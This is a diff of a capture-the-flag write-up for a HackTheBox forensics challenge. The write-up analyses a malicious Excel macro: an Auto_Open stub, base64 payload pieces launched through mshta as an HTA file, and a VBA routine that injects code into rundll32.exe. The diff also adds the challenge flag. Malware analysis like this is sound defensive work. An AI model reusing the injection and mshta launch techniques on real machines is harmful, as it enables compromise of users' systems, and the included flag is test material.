@@ -1,5 +1,3 @@
-# oBfsC4t10n
-
 > This document came in as an email attachment. Our SOC tells us that they think
 > there were some errors in it that caused it not to execute correctly. Can you
 > figure out what the command and control mechanism would have been had it worked?
@@ -96,7 +94,7 @@ reproduce the functionality.
 
 The `Auto_Open` function is at the root of the process:
 
-```vba
+```shell
 Sub Auto_Open()
     Dim fHdswUyK, GgyYKuJh
     Application.Goto ("JLprrpFr")
@@ -143,7 +141,7 @@ description in LibreOffice.
 I had already found the 2 other parts
 So I extracted & concatenated the obfuscated payload parts beforehand.
 
-```vba
+```shell
 output_file_path = "/root/workspace/ctf/hackthebox/forensics/obfsc4t10n/payload.hta"
 p1 = "PGh0bWw+PGhlYWQ+PHNjcmlwdCBsYW5ndWFnZT0idmJzY3JpcHQiPgpEaW0gb2JqRXhjZWwsIF..."
 p2 = "lvbk5hbWUgIiYiQXMgU3RyaW4iJiJnIiZDaHIoNDQpJiIgQnlWYWwgbCImInBDb21tYW5kIiYi..."
@@ -159,7 +157,7 @@ payload = "mshta " & output_file_path
 
 It results in an "hta" file: MS HTML application, which is actually plain VBScript.
 
-```vbscript
+```shell
 Dim objExcel, WshShell, RegPath, action, objWorkbook, xlmodule
 
 Set objExcel = CreateObject("Excel.Application")
@@ -202,7 +200,7 @@ the full picture.
 
 It is a VBA script which performs a PE injection on "rundll32.exe":
 
-```vba
+```shell
 If Len(Environ("ProgramW6432")) > 0 Then
         sProc = Environ("windir") & "\\SysWOW64\\rundll32.exe"
     Else
@@ -243,8 +241,9 @@ blobrunner while it triggers the shellcode:
 
 The code contains a loop (see EIP above) modifying the rest of the payload!
 
-The resulting bytes make no sense when interpreted as assembly, it's
-plain ASCII.
+The resulting bytes make no sense when interpreted as assembly, it's plain ASCII:
+
+> `HTB{g0_G3t_th3_ph1sh3R}`
 
 [author-profile]: https://app.hackthebox.com/users/4935
 [debugging-shellcode-screenshot]: images/debugging-shellcode.png
